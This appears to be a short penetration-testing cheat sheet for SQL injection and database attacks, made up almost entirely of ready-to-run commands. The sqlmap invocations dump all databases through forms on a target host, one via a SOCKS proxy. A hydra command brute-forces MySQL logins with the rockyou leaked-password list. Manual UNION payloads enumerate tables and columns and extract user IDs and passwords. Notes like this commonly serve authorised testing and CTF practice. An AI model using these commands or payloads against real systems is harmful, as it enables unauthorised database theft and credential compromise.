# linux attacker

## check and dump information from sql injection

```bash
sqlmap --batch -a --forms -u "http://$rhost" --output-dir="."
sqlmap --batch -a --dump-all --forms -u "http://$rhost" --output-dir="."
```

## sqlmap use specific parameter and proxy

```bash
sqlmap -u http://rhost?id= --proxy socks5://127.0.0.1:1080
```


## bruteforce sql

```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt $rhost mysql
```

## dump big tables with each column on seperate line when connected with mysql client

Replace ; with \G

```sql
select * from users\G
```

## manual sql injection

```bash
' or 1=1 union all select 1,2,3,4,5,6,table_name,8 from information_schema.tables --
' or 1=1 union all select 1,2,3,4,5,6,column_name,8 from information_schema.columns where table_name='some_table' --
' union select concat(id, '--', pass, '--', name),1 from users --
```

### manual sql enumeration

```sql
show Grants;
show variables;
```
